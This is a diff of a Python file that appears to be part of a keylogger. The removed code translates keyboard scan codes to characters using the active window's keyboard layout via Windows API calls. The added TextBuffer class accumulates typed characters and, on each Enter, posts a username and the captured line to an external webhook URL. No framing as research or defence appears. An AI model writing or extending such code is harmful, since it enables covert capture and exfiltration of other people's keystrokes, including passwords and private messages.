@@ -1,57 +1,38 @@
-import ctypes
 import os
 import requests
-from ctypes import wintypes
 from dotenv import load_dotenv
 
 load_dotenv()
 
 WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
 
-user32 = ctypes.WinDLL('user32', use_last_error=True)
 
-user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, wintypes.HKL]
-user32.MapVirtualKeyExW.restype = wintypes.UINT
-MAPVK_VSC_TO_VK_EX = 3
+class TextBuffer:
+    def __init__(self):
+        self.usernames = []
+        self.buffer = None
+        self.init_buffer()
 
-user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_uint8 * 256)]
-user32.GetKeyboardState.restype = wintypes.BOOL
+    def send_message(self):
+        message = self.usernames[0] + ": " + self.buffer
+        payload = {"content": message}
+        requests.post(WEBHOOK_URL, data=payload)
 
-user32.ToUnicodeEx.argtypes = [
-    wintypes.UINT,
-    wintypes.UINT,
-    ctypes.POINTER(ctypes.c_uint8 * 256),
-    wintypes.LPWSTR,
-    ctypes.c_int,
-    wintypes.UINT,
-    wintypes.HKL
-]
-user32.ToUnicodeEx.restype = ctypes.c_int
+    def init_buffer(self):
+        self.buffer = ""
 
-user32.GetForegroundWindow.restype = wintypes.HWND
-user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
-user32.GetWindowThreadProcessId.restype = wintypes.DWORD
-user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
-user32.GetKeyboardLayout.restype = wintypes.HKL
+    def handle_char(self, character):
+        self.buffer += character
 
+    def handle_backspace(self):
+        self.buffer = self.buffer[:-1]
 
-def char_for_layout(scan_code, hkl):
-    vk = user32.MapVirtualKeyExW(scan_code, MAPVK_VSC_TO_VK_EX, hkl)
-    ks = (ctypes.c_uint8 * 256)()
-    user32.GetKeyboardState(ctypes.byref(ks))
-    buf = ctypes.create_unicode_buffer(8)
-    n = user32.ToUnicodeEx(vk, scan_code, ctypes.byref(ks), buf, len(buf), 0, hkl)
-    return buf.value[:n] if n > 0 else ''
+    def handle_enter(self):
+        self.send_message()
+        self.init_buffer()
 
+    def handle_space(self):
+        self.buffer += " "
 
-def decode(scan_code):
-    hwnd = user32.GetForegroundWindow()
-    pid = wintypes.DWORD()
-    tid = user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
-    hkl = user32.GetKeyboardLayout(tid)
-    return char_for_layout(scan_code, hkl)
-
-
-def send_message(message):
-    payload = {"content": message}
-    requests.post(WEBHOOK_URL, data=payload)
+    def handle_esc(self):
+        return False
